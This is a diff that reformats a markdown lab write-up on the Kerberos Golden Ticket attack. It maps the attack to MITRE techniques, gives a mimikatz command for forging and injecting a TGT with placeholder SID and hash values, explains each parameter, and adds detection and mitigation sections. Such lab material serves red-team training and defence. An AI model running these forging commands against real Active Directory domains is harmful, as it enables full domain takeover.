@@ -4,10 +4,8 @@ The Golden Ticket attack involves forging a Kerberos Ticket Granting Ticket (TGT
 This attack is typically used after a successful DCSync operation.
 
 ## MITRE ATT&CK Techniques:
-
-T1558.001 – Forge Kerberos Tickets (Golden Ticket)
-
-T1550.002 – Use of Valid Accounts: Pass-the-Ticket
+- T1558.001 – Forge Kerberos Tickets (Golden Ticket)
+- T1550.002 – Use of Valid Accounts: Pass-the-Ticket
 
 ## Lab Environment
 - **Domain Controller:** dc01.internal.lab
@@ -22,42 +20,34 @@ T1550.002 – Use of Valid Accounts: Pass-the-Ticket
 - Attacker has mimikatz or similar tooling available
 
 ## Objectives
-Forge a valid Kerberos TGT with arbitrary user details
-
-Inject the forged ticket into the current session
-
-Access privileged network resources (e.g., C$ shares, AD services)
+- Forge a valid Kerberos TGT with arbitrary user details
+- Inject the forged ticket into the current session
+- Access privileged network resources (e.g., C$ shares, AD services)
 
 ## Execution Steps
 Forge Golden Ticket
 
-Using mimikatz:
+### Using mimikatz:
 
 ```kerberos::golden /user:Administrator /domain:internal.lab /sid:S-1-5-21-XXXXXXXXX /krbtgt:<NTLMHASH> /id:500 /groups:512 /ptt```
 
-Parameters:
+**Parameters:**
 
 /user: - the fake username (can be real or fabricated)
-
 /domain: - AD domain name
-
 /sid: - domain SID
-
 /krbtgt: - NTLM hash from DCSync
-
 /id:500 - RID of the impersonated user (500 = Administrator)
-
 /groups: - group RIDs (e.g., 512 = Domain Admins)
-
 /ptt - injects the ticket into current session
 
-Confirm Ticket Injection
+### Confirm Ticket Injection
 
 ```kerberos::list```
 
 Ensure a TGT is present for the spoofed user.
 
-## Access Resources
+### Access Resources
 
 Try to access:
 
@@ -95,24 +85,18 @@ SecurityEvent
 ```
 
 ## Mitigations
-Regularly rotate the krbtgt password (twice if possible)
-
-Detect and block anomalous ticket lifetimes and SID values
-
-Monitor use of administrative group RIDs from non-standard hosts
-
-Use tiered admin model to isolate Domain Admin access to jump boxes
+- Regularly rotate the krbtgt password (twice if possible)
+- Detect and block anomalous ticket lifetimes and SID values
+- Monitor use of administrative group RIDs from non-standard hosts
+- Use tiered admin model to isolate Domain Admin access to jump boxes
 
 ## References
-https://adsecurity.org/?p=1640
-
-https://www.harmj0y.net/blog/redteaming/kerberos-attacks/
-
-https://attack.mitre.org/techniques/T1558/001/
-
-https://github.com/gentilkiwi/mimikatz
+- https://adsecurity.org/?p=1640
+- https://www.harmj0y.net/blog/redteaming/kerberos-attacks/
+- https://attack.mitre.org/techniques/T1558/001/
+- https://github.com/gentilkiwi/mimikatz
 
 ## Navigation
 [Back to Lab Index:](../../README.md)
-[Related: NTLM Relay]()
+[Related: NTLM Relay](../NTLM-relay.md)
 
